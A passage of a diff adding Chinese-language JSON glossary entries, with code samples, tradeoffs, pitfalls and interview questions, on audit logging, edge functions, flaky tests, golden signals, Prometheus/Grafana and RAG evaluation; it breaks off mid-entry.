+     "流量分析、安全检测",
+     "中短期，量大"
+    ],
+    [
+     "变更数据捕获",
+     "数据同步",
+     "不面向追责，无操作者上下文"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "数据库内审计表",
+    "pros": "实现简单，可与业务事务一起写入",
+    "cons": "DBA 仍可篡改，影响主库容量",
+    "when": "早期产品"
+   },
+   {
+    "opt": "独立日志/SIEM 服务",
+    "pros": "集中检索与告警，权限隔离",
+    "cons": "费用，需可靠投递",
+    "when": "有安全团队与合规要求"
+   },
+   {
+    "opt": "WORM 对象存储归档",
+    "pros": "强防篡改，存储便宜",
+    "cons": "查询不便",
+    "when": "长期合规保留"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "审计记录与业务数据同库同权限，可被任意修改",
+    "fix": "仅追加权限，关键环境同步到独立的防篡改存储"
+   },
+   {
+    "bad": "把密码、令牌或完整 PII 写进审计元数据",
+    "fix": "记录变更字段名与脱敏后的值，不记录秘密"
+   },
+   {
+    "bad": "只记录成功操作，忽略被拒绝的尝试",
+    "fix": "失败与拒绝同样记录，它们常是攻击信号"
+   },
+   {
+    "bad": "服务账号、API Key 操作没有可追溯的操作者",
+    "fix": "为每个自动化主体分配独立身份并记录"
+   }
+  ],
+  "checklist": [
+   "关键操作清单已定义并全部覆盖",
+   "记录主体、时间、来源、动作、对象、结果",
+   "存储仅追加并限制访问",
+   "保留期满足合规与客户要求",
+   "异常操作有告警",
+   "企业客户可检索与导出"
+  ],
+  "interview": [
+   {
+    "q": "审计日志应记录哪些字段？",
+    "a": "至少包括时间（统一时区）、操作者及其类型、认证方式、来源 IP/设备、动作、目标资源、结果（成功/拒绝）、请求或关联 ID；变更类操作记录前后差异，敏感值脱敏。"
+   },
+   {
+    "q": "如何证明审计日志没有被篡改？",
+    "a": "权限上仅追加；写入 WORM 存储；对记录做哈希链或定期把批次摘要签名并锚定到外部系统；访问和导出审计日志本身也要记录，形成二级审计。"
+   },
+   {
+    "q": "AI Agent 代用户执行操作时审计要注意什么？",
+    "a": "同时记录代表的用户与执行的 Agent/工具身份、触发的提示或任务 ID、调用的工具与参数摘要，以便区分人工操作与自动操作并追溯决策链。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP：Logging Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html"
+   },
+   {
+    "title": "NIST SP 800-92：Guide to Computer Security Log Management",
+    "url": "https://csrc.nist.gov/pubs/sp/800/92/final"
+   },
+   {
+    "title": "AWS 文档：S3 Object Lock",
+    "url": "https://docs.aws.amazon.com/AmazonS3/latest/userguide/object-lock.html"
+   }
+  ]
+ },
+ {
+  "slug": "edge-functions",
+  "def": "边缘函数（Edge Functions）是部署在 CDN 或边缘网络众多节点上的轻量无服务器函数，请求在离用户最近的节点执行。它属于部署与网络层，多基于 V8 isolate 等轻量运行时，启动快、冷启动低，但 API 与资源受限。代表有 Cloudflare Workers、Vercel Edge Functions/Middleware、Deno Deploy、Supabase Edge Functions，常用于鉴权、重定向、个性化与 A/B。",
+  "how": [
+   "开发者编写处理 Request、返回 Response 的函数，平台把代码分发到全球边缘节点。",
+   "用户请求经 Anycast/DNS 路由到最近节点，在该节点的隔离环境中执行函数。",
+   "函数可读取请求头、Cookie 与平台提供的地理信息，决定重写、重定向、直接响应或回源。",
+   "运行时多为 Web 标准 API（fetch、Request、Response、Web Crypto），通常不支持完整 Node.js 内置模块与原生扩展。",
+   "需要数据时访问边缘 KV、全球分布式数据库或回源；访问单区域数据库会引入跨地域往返延迟。"
+  ],
+  "terms": [
+   {
+    "t": "V8 Isolate",
+    "d": "同一进程内相互隔离的轻量 JS 执行环境，启动远快于容器。"
+   },
+   {
+    "t": "Anycast",
+    "d": "多个节点共享同一 IP，网络把用户路由到最近节点。"
+   },
+   {
+    "t": "边缘中间件 (Edge Middleware)",
+    "d": "在请求到达页面或 API 前运行的边缘逻辑。"
+   },
+   {
+    "t": "边缘 KV (Edge KV)",
+    "d": "在边缘节点间复制的键值存储，读快、写入最终一致。"
+   },
+   {
+    "t": "回源 (Origin Fetch)",
+    "d": "边缘节点向源站请求内容或数据。"
+   }
+  ],
+  "code": {
+   "lang": "javascript",
+   "title": "Cloudflare Worker 按国家跳转",
+   "src": "// 使用 Workers 的 ES Module 语法，部署：npx wrangler deploy\nconst LANG_BY_COUNTRY = { CN: \"zh\", TW: \"zh\", JP: \"ja\", DE: \"de\" };\n\nexport default {\n  async fetch(request) {\n    const url = new URL(request.url);\n    // 已在语言路径下则直接回源，避免循环跳转\n    if (/^\\/(zh|ja|de|en)(\\/|$)/.test(url.pathname)) {\n      return fetch(request);\n    }\n    // request.cf 由 Cloudflare 注入，包含访问者国家代码\n    const country = request.cf?.country ?? \"US\";\n    const lang = LANG_BY_COUNTRY[country] ?? \"en\";\n    url.pathname = `/${lang}${url.pathname}`;\n    return Response.redirect(url.toString(), 302);\n  },\n};",
+   "note": "地理判断在最近节点完成，无需回源；国家代码来自平台注入的 request.cf。"
+  },
+  "table": {
+   "title": "边缘函数 vs 区域无服务器函数",
+   "head": [
+    "维度",
+    "边缘函数",
+    "区域无服务器函数"
+   ],
+   "rows": [
+    [
+     "执行位置",
+     "全球众多节点",
+     "选定的一个或几个区域"
+    ],
+    [
+     "冷启动",
+     "通常很低",
+     "可能较明显"
+    ],
+    [
+     "运行时能力",
+     "Web 标准 API，限制较多",
+     "完整语言运行时"
+    ],
+    [
+     "数据访问",
+     "离单区域数据库远",
+     "可与数据库同区域"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "边缘函数",
+    "pros": "全球低延迟、冷启动低",
+    "cons": "运行时受限，访问中心数据库慢",
+    "when": "鉴权、重定向、个性化、A/B"
+   },
+   {
+    "opt": "区域无服务器函数",
+    "pros": "完整运行时，靠近数据库",
+    "cons": "远端用户延迟较高",
+    "when": "业务 API、数据库密集逻辑"
+   },
+   {
+    "opt": "边缘 + 区域混合",
+    "pros": "边缘做轻逻辑，重活回源",
+    "cons": "架构更复杂",
+    "when": "全球用户的 Web 应用"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "在边缘函数中多次查询单区域数据库",
+    "fix": "把数据库逻辑放在靠近数据库的区域函数，或使用边缘缓存/复制数据"
+   },
+   {
+    "bad": "引入依赖 Node 内置模块的库导致运行失败",
+    "fix": "选择支持 Web 标准运行时的库，部署前在对应运行时测试"
+   },
+   {
+    "bad": "在边缘做 CPU 密集计算",
+    "fix": "边缘通常有 CPU 时间限制，重计算移到区域函数或队列"
+   },
+   {
+    "bad": "把密钥硬编码在边缘代码中",
+    "fix": "使用平台的 Secret/环境变量绑定"
+   }
+  ],
+  "checklist": [
+   "边缘逻辑轻量且无重度数据库访问",
+   "依赖库兼容边缘运行时",
+   "设置并测试 CPU/内存限制",
+   "密钥通过平台绑定注入",
+   "有回退路径避免跳转循环"
+  ],
+  "interview": [
+   {
+    "q": "什么时候不适合用边缘函数？",
+    "a": "逻辑需要多次访问单一区域的数据库、依赖完整 Node API 或原生模块、CPU 密集或长时间运行时。此时用区域函数或容器，边缘只做前置的轻逻辑。"
+   },
+   {
+    "q": "V8 isolate 为什么冷启动快？",
+    "a": "多个 isolate 运行在同一进程中，无需为每个函数启动容器或虚拟机与完整运行时，只需创建隔离的堆和上下文，开销远小于容器冷启动。"
+   },
+   {
+    "q": "边缘 KV 的一致性如何？",
+    "a": "通常读多写少、写入在全球传播需要时间，属于最终一致；不适合需要强一致的计数或库存。强一致需求可用 Durable Objects 一类单点协调对象或中心数据库。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Cloudflare Workers 文档",
+    "url": "https://developers.cloudflare.com/workers/"
+   },
+   {
+    "title": "Cloudflare Workers：How Workers works",
+    "url": "https://developers.cloudflare.com/workers/reference/how-workers-works/"
+   },
+   {
+    "title": "Supabase 文档：Edge Functions",
+    "url": "https://supabase.com/docs/guides/functions"
+   }
+  ]
+ },
+ {
+  "slug": "flaky-tests",
+  "def": "不稳定测试（Flaky Test）是在代码与环境未变的情况下，多次运行结果时而通过时而失败的测试。它属于测试工程与 CI 可靠性层，根因通常是非确定性：时序与异步等待、测试间共享状态、执行顺序依赖、外部服务、时间与随机数、资源竞争。不稳定测试会侵蚀团队对 CI 的信任，导致真实失败被当作噪音忽略。",
+  "how": [
+   "检测：同一提交多次运行结果不同；CI 中失败后重试通过的测试被标记为疑似不稳定。",
+   "复现：用重复执行（如 --repeat-each）、随机顺序、并行度变化或压力负载放大问题出现概率。",
+   "定位：借助失败时的日志、截图、trace 与时间线，判断属于等待、状态、顺序、外部依赖哪一类。",
+   "隔离：把确认不稳定的测试移入隔离区（quarantine），不阻塞合并，但必须有负责人与修复期限。",
+   "修复：用条件等待替代固定睡眠、每个测试独立数据、模拟外部依赖、固定时间与随机种子，然后恢复。"
+  ],
+  "terms": [
+   {
+    "t": "非确定性 (Non-determinism)",
+    "d": "相同输入下结果不一致的来源，如时序、随机数。"
+   },
+   {
+    "t": "隔离区 (Quarantine)",
+    "d": "暂时不阻塞流水线的不稳定测试集合，需跟踪修复。"
+   },
+   {
+    "t": "自动等待 (Auto-waiting)",
+    "d": "测试框架在操作前等待元素可交互，替代固定延时。"
+   },
+   {
+    "t": "测试隔离 (Test Isolation)",
+    "d": "每个测试独立的数据与状态，不受其他测试影响。"
+   },
+   {
+    "t": "Trace",
+    "d": "Playwright 记录的操作、网络与 DOM 快照，用于事后排查失败。"
+   }
+  ],
+  "code": {
+   "lang": "typescript",
+   "title": "Playwright：去掉固定等待",
+   "src": "import { test, expect } from \"@playwright/test\";\n\ntest(\"提交订单后显示成功\", async ({ page }) => {\n  await page.goto(\"/checkout\");\n  await page.getByRole(\"button\", { name: \"提交订单\" }).click();\n\n  // ❌ 固定睡眠：机器慢时不够，机器快时浪费\n  // await page.waitForTimeout(2000);\n  // expect(await page.textContent(\".toast\")).toBe(\"下单成功\");\n\n  // ✅ Web-first 断言：自动重试直到满足或超时\n  await expect(page.getByText(\"下单成功\")).toBeVisible();\n});\n\n// playwright.config.ts 中：\n//   retries: process.env.CI ? 2 : 0,      // 重试用于暴露不稳定，不是修复\n//   use: { trace: \"on-first-retry\" },      // 首次重试时记录 trace 便于排查\n// 本地复现：npx playwright test checkout.spec.ts --repeat-each=50",
+   "note": "expect(...).toBeVisible() 会自动等待；--repeat-each 放大复现概率，trace 帮助定位原因。"
+  },
+  "table": {
+   "title": "不稳定原因与修复",
+   "head": [
+    "根因",
+    "典型表现",
+    "修复方向"
+   ],
+   "rows": [
+    [
+     "异步等待",
+     "固定 sleep，偶发超时",
+     "条件等待、Web-first 断言"
+    ],
+    [
+     "共享状态",
+     "并行时互相覆盖数据",
+     "每测试独立数据/事务回滚"
+    ],
+    [
+     "顺序依赖",
+     "单独跑过、一起跑挂",
+     "去除隐式依赖，随机顺序运行"
+    ],
+    [
+     "外部依赖",
+     "第三方接口偶发失败",
+     "Mock/录制回放，契约测试"
+    ],
+    [
+     "时间与随机",
+     "跨午夜、时区、随机数据失败",
+     "注入固定时钟与随机种子"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "自动重试",
+    "pros": "减少偶发失败阻塞",
+    "cons": "掩盖问题，可能放过真实缺陷",
+    "when": "临时缓解，并配合统计上报"
+   },
+   {
+    "opt": "隔离区 + 修复期限",
+    "pros": "不阻塞团队又不丢失跟踪",
+    "cons": "隔离期间该测试保护失效",
+    "when": "已确认的不稳定测试"
+   },
+   {
+    "opt": "删除测试",
+    "pros": "立即消除噪音",
+    "cons": "失去覆盖",
+    "when": "测试价值低且修复成本高"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "失败就点重跑，从不追查",
+    "fix": "记录每次重试通过的测试并统计不稳定率，定期修复"
+   },
+   {
+    "bad": "用更长的 sleep 解决偶发超时",
+    "fix": "等待具体条件（元素、网络响应、状态），而非时间"
+   },
+   {
+    "bad": "测试共用同一账号与数据库记录",
+    "fix": "每个测试创建独立数据，或使用事务回滚/独立 schema"
+   },
+   {
+    "bad": "隔离区只进不出，越积越多",
+    "fix": "隔离需有负责人与期限，超期升级处理"
+   }
+  ],
+  "checklist": [
+   "CI 统计并展示不稳定测试",
+   "无固定 sleep 等待",
+   "测试数据相互隔离",
+   "外部服务已 Mock 或有稳定替身",
+   "失败时自动保存 trace/截图/日志",
+   "隔离测试有负责人与期限"
+  ],
+  "interview": [
+   {
+    "q": "如何系统地发现不稳定测试？",
+    "a": "在 CI 中记录每个测试的历史结果，失败后重试通过即标记；定期对主干同一提交多次运行；使用随机顺序与不同并行度；按不稳定率排行并分配修复。"
+   },
+   {
+    "q": "为什么说重试不是修复？",
+    "a": "重试只降低失败被看见的概率，根因仍在，还可能让真实的偶发缺陷（如竞态 Bug）溜进生产。重试应伴随上报与追踪，用于发现而非掩盖。"
+   },
+   {
+    "q": "AI 生成的 E2E 测试常见哪些不稳定写法？",
+    "a": "固定 waitForTimeout、依赖 CSS 选择器与文本位置、共用测试账号、依赖真实外部接口、断言动态内容（时间、随机 ID）。评审时应重点检查并改为语义定位与条件等待。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Playwright 文档：Retries",
+    "url": "https://playwright.dev/docs/test-retries"
+   },
+   {
+    "title": "Playwright 文档：Auto-waiting",
+    "url": "https://playwright.dev/docs/actionability"
+   },
+   {
+    "title": "Martin Fowler：Eradicating Non-Determinism in Tests",
+    "url": "https://martinfowler.com/articles/nonDeterminism.html"
+   }
+  ]
+ },
+ {
+  "slug": "golden-signals",
+  "def": "四大黄金信号（Four Golden Signals）是 Google《SRE》一书提出的面向用户服务的监控基线：延迟（Latency）、流量（Traffic）、错误（Errors）、饱和度（Saturation）。它属于可观测性与 SRE 实践层，回答「服务对用户是否健康」，为 SLO 与告警提供起点；同类方法还有面向请求的 RED 与面向资源的 USE。",
+  "how": [
+   "延迟：处理请求所需时间，用分位数（P50/P95/P99）而非平均值，并区分成功与失败请求的延迟。",
+   "流量：系统承受的需求量，如每秒 HTTP 请求数、并发会话数、每秒处理的消息数或 Token 数。",
+   "错误：失败请求的比率，包括显式错误（5xx）、隐式错误（200 但内容错误）和超出 SLO 的慢响应。",
+   "饱和度：服务有多「满」，关注最受限的资源，如 CPU、内存、连接池、队列长度、GPU 显存，常作为容量预警。",
+   "基于四个信号建立看板与 SLO，告警优先针对影响用户的症状（错误率、延迟），而不是底层原因。"
+  ],
+  "terms": [
+   {
+    "t": "分位数延迟 (Percentile Latency)",
+    "d": "P99 表示 99% 请求不超过该耗时，能暴露长尾。"
+   },
+   {
+    "t": "RED 方法",
+    "d": "Rate、Errors、Duration，面向请求驱动服务的简化版本。"
+   },
+   {
+    "t": "USE 方法",
+    "d": "Utilization、Saturation、Errors，面向资源（CPU、磁盘）的分析方法。"
+   },
+   {
+    "t": "症状告警 (Symptom-based Alerting)",
+    "d": "按用户可感知的问题告警，而非按内部原因。"
+   },
+   {
+    "t": "SLI / SLO",
+    "d": "服务水平指标 / 目标，常由黄金信号推导而来。"
+   }
+  ],
+  "code": {
+   "lang": "yaml",
+   "title": "Prometheus 中的四个信号",
+   "src": "# recording rules：把四个信号预计算为便于看板和告警使用的指标\ngroups:\n  - name: golden-signals\n    rules:\n      - record: job:http_requests:rate5m          # 流量\n        expr: sum by (job) (rate(http_requests_total[5m]))\n      - record: job:http_errors:ratio5m           # 错误率\n        expr: |\n          sum by (job) (rate(http_requests_total{status=~\"5..\"}[5m]))\n          / sum by (job) (rate(http_requests_total[5m]))\n      - record: job:http_latency:p99_5m           # 延迟（P99）\n        expr: |\n          histogram_quantile(0.99,\n            sum by (job, le) (rate(http_request_duration_seconds_bucket[5m])))\n      - record: instance:cpu:saturation           # 饱和度（以 CPU 使用率示意）\n        expr: 1 - avg by (instance) (rate(node_cpu_seconds_total{mode=\"idle\"}[5m]))",
+   "note": "指标名遵循常见约定（需应用与 node_exporter 暴露对应指标）；饱和度应选最先耗尽的资源。"
+  },
+  "table": {
+   "title": "三种监控方法对比",
+   "head": [
+    "方法",
+    "关注对象",
+    "指标"
+   ],
+   "rows": [
+    [
+     "四大黄金信号",
+     "面向用户的服务",
+     "延迟、流量、错误、饱和度"
+    ],
+    [
+     "RED",
+     "请求驱动的微服务",
+     "速率、错误、耗时"
+    ],
+    [
+     "USE",
+     "硬件与系统资源",
+     "利用率、饱和度、错误"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "症状告警（错误率、延迟）",
+    "pros": "直接对应用户影响，噪音少",
+    "cons": "定位根因需要再下钻",
+    "when": "值班告警的主要来源"
+   },
+   {
+    "opt": "原因告警（CPU、磁盘）",
+    "pros": "能提前预警",
+    "cons": "易产生大量不影响用户的告警",
+    "when": "容量预警，通常不叫醒人"
+   },
+   {
+    "opt": "基于 SLO 燃烧率告警",
+    "pros": "兼顾灵敏度与误报",
+    "cons": "需先定义 SLO 与错误预算",
+    "when": "成熟团队的标准做法"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "用平均延迟衡量性能",
+    "fix": "使用 P95/P99 等分位数，并用直方图指标聚合"
+   },
+   {
+    "bad": "错误只统计 5xx",
+    "fix": "把业务失败、超时与超过 SLO 的慢请求也计入"
+   },
+   {
+    "bad": "把失败请求的快速响应混入延迟统计，使延迟看起来很好",
+    "fix": "成功与失败请求的延迟分开统计"
+   },
+   {
+    "bad": "饱和度只看 CPU",
+    "fix": "找出真正的瓶颈资源：连接池、队列、线程池、显存"
+   }
+  ],
+  "checklist": [
+   "每个对外服务都有四个信号的看板",
+   "延迟使用直方图与分位数",
+   "错误定义包含隐式错误",
+   "饱和度指向最受限资源",
+   "告警以用户症状为主",
+   "LLM 服务额外监控 TTFT 与 Token 吞吐"
+  ],
+  "interview": [
+   {
+    "q": "为什么不用平均延迟？",
+    "a": "延迟分布通常长尾，少量极慢请求被大量快请求平均掉；而长尾请求往往影响最重要的用户或在扇出调用中被放大。分位数能直接反映这部分体验。"
+   },
+   {
+    "q": "饱和度和利用率有什么区别？",
+    "a": "利用率是资源忙碌的时间比例；饱和度是超出处理能力、正在排队的工作量。利用率 100% 前就可能出现排队，延迟上升，饱和度更能预测性能劣化。"
+   },
+   {
+    "q": "LLM 应用的黄金信号如何调整？",
+    "a": "延迟可拆为首 Token 时间与每 Token 时间；流量用请求数与 Token 吞吐；错误包含限流、超时、内容拒绝和结构化输出解析失败；饱和度关注 GPU 显存、KV 缓存与排队长度。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Google SRE Book：Monitoring Distributed Systems",
+    "url": "https://sre.google/sre-book/monitoring-distributed-systems/"
+   },
+   {
+    "title": "Brendan Gregg：The USE Method",
+    "url": "https://www.brendangregg.com/usemethod.html"
+   },
+   {
+    "title": "Prometheus 文档：Histograms and summaries",
+    "url": "https://prometheus.io/docs/practices/histograms/"
+   }
+  ]
+ },
+ {
+  "slug": "prometheus-and-grafana",
+  "def": "Prometheus 是 CNCF 毕业的开源监控系统与时序数据库，以拉取（pull）方式定期抓取目标暴露的指标，用 PromQL 查询，并通过 Alertmanager 发送告警；Grafana 是开源可视化平台，连接 Prometheus 等数据源构建看板。二者组合是云原生指标监控的事实标准，属于可观测性层中的指标（metrics）支柱。",
+  "how": [
+   "应用通过客户端库或 exporter 在 /metrics 端点以文本格式暴露计数器、仪表、直方图等指标。",
+   "Prometheus 按 scrape_interval 定期拉取各目标，目标来自静态配置或服务发现（如 Kubernetes）。",
+   "样本以「指标名 + 标签集」标识的时间序列存入本地 TSDB；记录规则可预计算常用查询。",
+   "告警规则持续计算 PromQL 表达式，条件持续满足 for 时长后发给 Alertmanager，由其去重、分组、路由到通知渠道。",
+   "Grafana 以 Prometheus 为数据源执行 PromQL，渲染图表与看板，也可配置自身的告警。"
+  ],
+  "terms": [
+   {
+    "t": "时间序列 (Time Series)",
+    "d": "由指标名和标签唯一标识的一串带时间戳的样本。"
+   },
+   {
+    "t": "Counter / Gauge / Histogram",
+    "d": "只增计数器 / 可增可减的瞬时值 / 分桶分布。"
+   },
+   {
+    "t": "PromQL",
+    "d": "Prometheus 查询语言，支持 rate、sum by、histogram_quantile 等。"
+   },
+   {
+    "t": "Exporter",
+    "d": "把第三方系统（如数据库、主机）的状态转换为 Prometheus 指标的程序。"
+   },
+   {
+    "t": "基数 (Cardinality)",
+    "d": "时间序列数量，由标签取值组合决定，过高会耗尽内存。"
+   },
+   {
+    "t": "Alertmanager",
+    "d": "接收告警并负责去重、分组、静默与通知路由的组件。"
+   }
+  ],
+  "code": {
+   "lang": "yaml",
+   "title": "抓取配置与告警规则",
+   "src": "# prometheus.yml\nglobal:\n  scrape_interval: 15s\nrule_files: [\"alerts.yml\"]\nalerting:\n  alertmanagers:\n    - static_configs: [{ targets: [\"alertmanager:9093\"] }]\nscrape_configs:\n  - job_name: api\n    static_configs:\n      - targets: [\"api:3000\"]        # 应用暴露 http://api:3000/metrics\n---\n# alerts.yml\ngroups:\n  - name: api\n    rules:\n      - alert: HighErrorRate\n        expr: |\n          sum(rate(http_requests_total{job=\"api\",status=~\"5..\"}[5m]))\n          / sum(rate(http_requests_total{job=\"api\"}[5m])) > 0.05\n        for: 10m                       # 持续 10 分钟才触发，避免抖动\n        labels: { severity: page }\n        annotations:\n          summary: \"API 5xx 错误率超过 5%\"",
+   "note": "两个文件以 --- 分隔仅为展示；阈值 5% 为示例，应按 SLO 设定。"
+  },
+  "table": {
+   "title": "指标类型选择",
+   "head": [
+    "类型",
+    "特点",
+    "典型指标",
+    "常用函数"
+   ],
+   "rows": [
+    [
+     "Counter",
+     "只增，重启归零",
+     "请求总数、错误总数",
+     "rate / increase"
+    ],
+    [
+     "Gauge",
+     "可增可减的当前值",
+     "内存使用、队列长度",
+     "直接取值、avg_over_time"
+    ],
+    [
+     "Histogram",
+     "按桶累计分布，可跨实例聚合",
+     "请求耗时、响应大小",
+     "histogram_quantile"
+    ],
+    [
+     "Summary",
+     "客户端计算分位数",
+     "单实例耗时分位数",
+     "不可跨实例聚合分位数"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "自建 Prometheus + Grafana",
+    "pros": "开源免费、生态完善、可控",
+    "cons": "需运维存储与高可用，长期存储需扩展",
+    "when": "有运维能力、中等规模"
+   },
+   {
+    "opt": "托管服务（Grafana Cloud、云厂商托管 Prometheus）",
+    "pros": "免运维、长期存储与高可用",
+    "cons": "按序列或样本计费",
+    "when": "团队小、规模增长快"
+   },
+   {
+    "opt": "长期存储扩展（Thanos、Mimir 等）",
+    "pros": "全局视图、长期保留、高可用",
+    "cons": "架构复杂",
+    "when": "多集群、大规模"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "把用户 ID、请求 ID 等高基数值作为标签",
+    "fix": "标签只用有限取值（状态码、路由模板），高基数信息放日志或追踪"
+   },
+   {
+    "bad": "对 Counter 直接画图或求和",
+    "fix": "先用 rate() 或 increase() 计算速率再聚合"
+   },
+   {
+    "bad": "用 Summary 分位数做跨实例平均",
+    "fix": "需要聚合时使用 Histogram，再 histogram_quantile"
+   },
+   {
+    "bad": "告警不设 for 或阈值随意，频繁抖动",
+    "fix": "设置持续时间，按 SLO 定义阈值并做告警分级"
+   }
+  ],
+  "checklist": [
+   "应用暴露 /metrics 且指标命名规范",
+   "标签基数受控",
+   "关键服务有告警规则并路由到值班",
+   "Prometheus 自身有监控与存储容量规划",
+   "看板覆盖黄金信号",
+   "长期存储与保留期按需配置"
+  ],
+  "interview": [
+   {
+    "q": "Prometheus 为什么采用拉模式？",
+    "a": "由服务端控制抓取频率，目标是否存活一目了然（抓取失败即 up=0），便于本地调试直接访问 /metrics。短生命周期任务可借助 Pushgateway，但不适合作为通用推送通道。"
+   },
+   {
+    "q": "rate() 和 irate() 有什么区别？",
+    "a": "rate 计算区间内的平均每秒增长率，平滑、适合告警与趋势；irate 只用区间内最后两个样本，反映瞬时变化，适合观察快速波动的图表，不适合告警。两者都会处理计数器重置。"
+   },
+   {
+    "q": "高基数问题如何发现与治理？",
+    "a": "查看 TSDB 状态页或用 count by (__name__) 找序列最多的指标；删除或改写高基数标签，用 relabel 丢弃无用标签，必要时为每个目标设置样本数上限。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Prometheus 文档：Overview",
+    "url": "https://prometheus.io/docs/introduction/overview/"
+   },
+   {
+    "title": "Prometheus 文档：Metric and label naming",
+    "url": "https://prometheus.io/docs/practices/naming/"
+   },
+   {
+    "title": "Grafana 文档",
+    "url": "https://grafana.com/docs/grafana/latest/"
+   }
+  ]
+ },
+ {
+  "slug": "rag-evaluation",
+  "def": "RAG 评测（RAG Evaluation）是对检索增强生成系统分环节量化质量的方法：检索端衡量是否找回了回答所需的上下文（召回率、精确率、MRR、nDCG），生成端衡量回答是否忠于上下文（忠实度/有据性）、是否切题（答案相关性）以及是否正确。它属于 LLM 应用的评测与质量保障层，代表工具有 RAGAS、TruLens 等。",
+  "how": [
+   "构建评测集：问题、参考答案，最好还有标注的相关文档或片段 ID，覆盖常见、困难与无答案问题。",
+   "检索评测：对每个问题运行检索，计算 Recall@k、Precision@k、MRR、nDCG 等，与标注的相关片段对比。",
+   "生成评测：用 LLM-as-a-judge 或 NLI 模型把回答拆成陈述，检查每条是否能由检索上下文支持，得到忠实度。",
+   "端到端评测：比较回答与参考答案的正确性，并评估答案相关性、拒答是否恰当。",
+   "把评测集成到迭代流程：切块、嵌入模型、重排、提示的每次改动都重跑并对比，回归即阻断。"
+  ],
+  "terms": [
+   {
+    "t": "Recall@k",
+    "d": "前 k 个检索结果中覆盖了多少比例的相关片段。"
+   },
+   {
+    "t": "MRR (Mean Reciprocal Rank)",
+    "d": "第一个相关结果排名倒数的平均值，衡量排序。"
+   },
+   {
+    "t": "忠实度 (Faithfulness)",
+    "d": "回答中的陈述能被检索上下文支持的比例。"
+   },
+   {
+    "t": "上下文精确率 (Context Precision)",
+    "d": "检索到的上下文中真正相关内容是否排在前面。"
+   },
+   {
+    "t": "答案相关性 (Answer Relevancy)",
+    "d": "回答与问题的切题程度，不衡量事实正确性。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "计算检索指标 Recall@k 与 MRR",
+   "src": "def recall_at_k(retrieved: list[str], relevant: set[str], k: int) -> float:\n    if not relevant:\n        return 1.0\n    return len(set(retrieved[:k]) & relevant) / len(relevant)\n\ndef reciprocal_rank(retrieved: list[str], relevant: set[str]) -> float:\n    for i, doc_id in enumerate(retrieved, start=1):\n        if doc_id in relevant:\n            return 1 / i\n    return 0.0\n\n# 评测集：每题标注相关片段 ID；retrieve() 为待评测的检索函数\ndataset = [\n    {\"q\": \"退货期限是多久？\", \"relevant\": {\"policy#3\"}},\n    {\"q\": \"国际运费怎么算？\", \"relevant\": {\"ship#1\", \"ship#4\"}},\n]\nrecalls, rrs = [], []\nfor item in dataset:\n    ids = retrieve(item[\"q\"], top_k=5)          # 返回片段 ID 列表\n    recalls.append(recall_at_k(ids, item[\"relevant\"], k=5))\n    rrs.append(reciprocal_rank(ids, item[\"relevant\"]))\nprint(f\"Recall@5={sum(recalls)/len(recalls):.2f}  MRR={sum(rrs)/len(rrs):.2f}\")\n# 生成端忠实度等指标可用 RAGAS 等库，以 LLM 作为评审计算",
+   "note": "检索指标确定、便宜，可每次提交运行；忠实度依赖 LLM 评审，需抽样人工校准。"
+  },
+  "table": {
+   "title": "按环节选择指标",
+   "head": [
+    "环节",
+    "指标",
+    "需要的标注"
+   ],
+   "rows": [
+    [
+     "检索",
+     "Recall@k、Precision@k",
+     "相关片段 ID"
+    ],
+    [
+     "排序",
+     "MRR、nDCG",
+     "相关片段（可带分级）"
+    ],
+    [
+     "生成-有据性",
+     "忠实度",
+     "无需参考答案，需上下文"
+    ],
+    [
+     "生成-正确性",
+     "答案正确性、相似度",
+     "参考答案"
+    ],
+    [
+     "整体",
+     "拒答准确率、人工评分",
+     "无答案问题与评审标准"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "确定性检索指标",
+    "pros": "便宜、稳定、可复现",
+    "cons": "需要标注相关片段",
+    "when": "调切块、嵌入、重排"
+   },
+   {
+    "opt": "LLM-as-a-judge",
+    "pros": "无需大量标注，可评语义",
+    "cons": "评审有偏差与波动，有成本",
+    "when": "评忠实度与相关性"
+   },
+   {
+    "opt": "人工评测",
+    "pros": "最可信",
+    "cons": "慢且贵",
+    "when": "校准自动指标、上线前抽检"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "只看最终回答好坏，不分环节",
+    "fix": "分别评测检索与生成，才知道该改哪里"
+   },
+   {
+    "bad": "评测集只有简单问题",
+    "fix": "覆盖多跳、对比、无答案与口语化问题"
+   },
+   {
+    "bad": "完全信任 LLM 评审分数",
+    "fix": "抽样人工复核，计算与人工判断的一致性"
+   },
+   {
+    "bad": "评测集与调参用同一批数据",
+    "fix": "保留独立测试集，防止过拟合评测"
+   }
+  ],
+  "checklist": [
+   "有带相关片段标注的评测集",
+   "检索与生成指标分开报告",
+   "包含无答案问题以检验拒答",
+   "LLM 评审经过人工校准",
+   "每次改动自动回归对比",
+   "线上抽样反馈补充进评测集"
+  ],
+  "interview": [
+   {
+    "q": "忠实度高但回答错误，可能是什么原因？",
+    "a": "回答忠于检索上下文，但上下文本身错误、过时或不相关，问题在检索或知识库；也可能参考答案标注有误。需结合上下文召回与知识库质量排查。"
+   },
+   {
+    "q": "没有人工标注时如何起步？",
+    "a": "用 LLM 从文档片段生成问题，天然知道相关片段 ID（合成数据），再人工筛查一部分；同时收集真实用户问题与反馈，逐步替换和补充。"
+   },
+   {
+    "q": "召回率和精确率在 RAG 中如何权衡？",
